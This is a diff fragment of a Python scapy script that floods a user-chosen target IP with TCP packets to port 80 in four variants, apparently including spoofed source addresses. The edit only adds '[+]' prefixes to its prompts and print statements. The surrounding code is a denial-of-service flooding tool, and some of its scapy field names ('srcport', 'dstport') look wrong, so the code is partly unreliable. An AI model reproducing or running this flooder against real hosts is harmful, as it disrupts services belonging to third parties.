@@ -1,9 +1,9 @@
 import random
 from scapy.all import IP,TCP,send
 
-source_IP = input("Enter IP address of Source: ")
-target_IP = input("Enter IP address of Target: ")
-source_port = int(input("Enter Source Port Number:"))
+source_IP = input("[+] Enter IP address of Source: ")
+target_IP = input("[+] Enter IP address of Target: ")
+source_port = int(input("[+] Enter Source Port Number:"))
 i = 1
 
 def SISP():
@@ -13,7 +13,7 @@ def SISP():
         pkt = IP1 / TCP1
         send(pkt, inter = .001)
         
-        print ("packet sent ", i)
+        print ("[+] packet sent ", i)
         i = i + 1 
 
 def SIMP():
@@ -24,7 +24,7 @@ def SIMP():
             pkt = IP1 / TCP1
             send(pkt, inter = .001)
         
-            print ("packet sent ", i)
+            print ("[+] packet sent ", i)
             i = i + 1
 
 def MISP():
@@ -40,7 +40,7 @@ def MISP():
         TCP1 = TCP(srcport = source_port, dstport = 80)
         pkt = IP1 / TCP1
         send(pkt,inter = .001)
-        print ("packet sent ", i)
+        print ("[+] packet sent ", i)
         i = i + 1
 
 def MIMP():
@@ -58,5 +58,5 @@ def MIMP():
             pkt = IP1 / TCP1
             send(pkt,inter = .001)
             
-            print ("packet sent ", i)
+            print ("[+] packet sent ", i)
             i = i + 1
